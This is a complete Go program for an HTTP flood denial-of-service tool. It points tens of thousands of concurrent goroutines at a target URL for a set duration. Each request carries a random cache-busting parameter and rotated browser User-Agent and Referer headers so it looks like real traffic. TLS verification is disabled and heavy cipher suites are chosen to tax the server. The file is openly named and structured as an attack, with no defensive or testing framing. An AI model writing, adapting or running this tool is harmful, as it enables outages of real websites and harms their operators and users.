package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

type AttackConfig struct {
	TargetURL  string
	Threads    int
	Duration   int
	UserAgents []string
	Referers   []string
}

type AttackStats struct {
	SuccessCount int64
	ErrorCount   int64
	TotalBytes   int64
	StartTime    time.Time
}

var (
	stats      AttackStats
	httpClient *http.Client
	stopChan   chan struct{}
)

func init() {
	heavyCipherSuites := []uint16{
		tls.TLS_AES_256_GCM_SHA384,
		tls.TLS_CHACHA20_POLY1305_SHA256,
		tls.TLS_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
		tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
	}

	httpClient = &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				CipherSuites:       heavyCipherSuites,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				CurvePreferences: []tls.CurveID{
					tls.CurveP521,
					tls.CurveP384,
					tls.X25519,
				},
			},
			MaxIdleConns:        0, // Unlimited
			MaxIdleConnsPerHost: 100000,
			ForceAttemptHTTP2:   true,
		},
	}

	stopChan = make(chan struct{})
}

func main() {
	target := flag.String("target", "", "Target URL (required)")
	threads := flag.Int("threads", 50000, "Number of concurrent threads")
	duration := flag.Int("duration", 300, "Attack duration in seconds")

	flag.Parse()

	if *target == "" {
		fmt.Println("Error: Target URL is required")
		flag.PrintDefaults()
		os.Exit(1)
	}

	config := &AttackConfig{
		TargetURL: *target,
		Threads:   *threads,
		Duration:  *duration,
	}

	initUserAgents(config)
	initReferers(config)
	setupSignalHandler()

	stats.StartTime = time.Now()
	startAttack(config)
}

func initUserAgents(config *AttackConfig) {
	config.UserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	}
}

func initReferers(config *AttackConfig) {
	config.Referers = []string{
		"https://www.google.com/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.twitter.com/",
		"https://www.instagram.com/",
		"https://www.linkedin.com/",
		"https://www.reddit.com/",
		"https://www.tiktok.com/",
		"https://www.pinterest.com/",
		"https://www.bing.com/",
	}
}

func startAttack(config *AttackConfig) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	for i := 0; i < config.Threads; i++ {
		go attackWorker(config)
	}

	go func() {
		time.Sleep(time.Duration(config.Duration) * time.Second)
		close(stopChan)
	}()

	go printStats()

	<-stopChan
	printFinalStats(config)
	os.Exit(0)
}

func attackWorker(config *AttackConfig) {
	for {
		select {
		case <-stopChan:
			return
		default:
			fireRequest(config)
		}
	}
}

func fireRequest(config *AttackConfig) {
	targetURL := buildAttackURL(config)

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return
	}

	randomizeHeaders(req, config)

	resp, err := httpClient.Do(req)
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return
	}

	if resp.Body != nil {
		n, _ := io.Copy(io.Discard, resp.Body)
		atomic.AddInt64(&stats.TotalBytes, n)
		resp.Body.Close()
	}

	atomic.AddInt64(&stats.SuccessCount, 1)
}

func buildAttackURL(config *AttackConfig) string {
	baseURL := config.TargetURL
	separator := "?"
	if strings.Contains(baseURL, "?") {
		separator = "&"
	}

	randomParams := fmt.Sprintf("%s_rnd=%d", separator, rand.Int63())
	return baseURL + randomParams
}

func randomizeHeaders(req *http.Request, config *AttackConfig) {
	req.Header.Set("User-Agent", config.UserAgents[rand.Intn(len(config.UserAgents))])
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", config.Referers[rand.Intn(len(config.Referers))])
}

func printStats() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			success := atomic.LoadInt64(&stats.SuccessCount)
			errors := atomic.LoadInt64(&stats.ErrorCount)
			duration := time.Since(stats.StartTime)
			rps := float64(success) / duration.Seconds()

			fmt.Printf("\rRPS: %.0f | Success: %d | Failed: %d", rps, success, errors)
		}
	}
}

func printFinalStats(config *AttackConfig) {
	duration := time.Since(stats.StartTime)
	total := stats.SuccessCount + stats.ErrorCount
	rps := float64(stats.SuccessCount) / duration.Seconds()

	fmt.Printf("\n\nFinal Statistics:\n")
	fmt.Printf("Success: %d\n", stats.SuccessCount)
	fmt.Printf("Failed: %d\n", stats.ErrorCount)
	fmt.Printf("Total Requests: %d\n", total)
	fmt.Printf("Average RPS: %.0f\n", rps)
	fmt.Printf("Duration: %.2f seconds\n", duration.Seconds())
}

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		fmt.Println("\nAttack interrupted by user. Shutting down...")
		close(stopChan)
	}()
}
